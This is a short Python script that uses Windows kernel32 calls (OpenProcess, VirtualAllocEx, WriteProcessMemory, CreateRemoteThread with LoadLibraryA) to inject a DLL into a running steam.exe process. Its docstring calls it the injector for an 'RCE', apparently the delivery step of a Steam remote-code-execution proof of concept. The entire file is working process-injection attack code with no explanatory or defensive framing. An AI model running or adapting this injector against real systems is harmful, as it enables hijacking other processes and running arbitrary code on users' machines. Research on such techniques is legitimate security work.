"""
Simple injector for the RCE (which requires we live inside an active steam proc)
Usage:
  python inject.py rce_downloadschedule.dll [steam.exe]
"""

import ctypes
import os
import subprocess
import sys

k32 = ctypes.windll.kernel32
k32.OpenProcess.restype = ctypes.c_void_p
k32.VirtualAllocEx.restype = ctypes.c_void_p
k32.VirtualAllocEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
k32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.CreateRemoteThread.restype = ctypes.c_void_p
k32.CreateRemoteThread.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
k32.GetModuleHandleA.restype = ctypes.c_void_p
k32.GetProcAddress.restype = ctypes.c_void_p
k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
k32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]

MEM_COMMIT_RESERVE = 0x3000
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = 0x1F0FFF


def find_pid(name):
    out = subprocess.check_output(["tasklist", "/FI", f"IMAGENAME eq {name}", "/FO", "CSV", "/NH"], text=True)
    for line in out.strip().splitlines():
        if name.lower() in line.lower():
            try:
                return int(line.strip('"').split('","')[1])
            except Exception:
                pass
    return None


def inject(pid, dll):
    dll = os.path.abspath(dll)
    blob = dll.encode() + b"\x00"
    h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h:
        sys.exit(f"[-] OpenProcess({pid}) failed: {k32.GetLastError()}")
    buf = k32.VirtualAllocEx(h, None, len(blob), MEM_COMMIT_RESERVE, PAGE_READWRITE)
    k32.WriteProcessMemory(h, buf, blob, len(blob), ctypes.byref(ctypes.c_size_t()))
    loadlib = k32.GetProcAddress(k32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
    t = k32.CreateRemoteThread(h, None, 0, loadlib, buf, 0, ctypes.byref(ctypes.c_ulong()))
    if not t:
        sys.exit(f"[-] CreateRemoteThread failed: {k32.GetLastError()}")
    print(f"[+] injected {os.path.basename(dll)} into pid {pid}")
    k32.WaitForSingleObject(t, 15000)


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    dll = sys.argv[1]
    target = sys.argv[2] if len(sys.argv) > 2 else "steam.exe"
    if not os.path.isfile(dll):
        sys.exit(f"[-] not found: {dll}")
    pid = find_pid(target)
    if not pid:
        sys.exit(f"[-] {target} not running")
    inject(pid, dll)


if __name__ == "__main__":
    main()
